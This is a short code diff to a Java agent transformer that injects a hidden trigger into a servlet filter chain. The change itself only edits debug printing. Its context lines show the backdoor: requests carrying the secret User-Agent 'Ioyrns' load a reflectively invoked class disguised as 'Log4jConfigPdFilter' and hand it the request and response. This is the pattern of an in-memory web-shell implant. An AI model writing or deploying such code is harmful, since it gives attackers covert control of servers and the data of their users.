@@ -38,13 +38,13 @@ public class MyTransformer implements ClassFileTransformer {
                             "    if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
                             "        try {" +
                             "            ClassLoader cl = this.getClass().getClassLoader();" +
-                            "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);;" +
+                            "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);" +
                             "            Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
                             "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                             "            Object obj = m.invoke(null, new Object[]{ cl });" +
                             "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
                             "            exec.invoke(obj, new Object[]{ req, res });" +
-                            "        } catch (Throwable t) { t.printStackTrace(); }" +
+                            "        } catch (Throwable t) { System.out.println(\"ApplicationFilterChain exception!!!\");t.printStackTrace(); }" +
                             "        return;" +
                             "    }" +
                             "}"
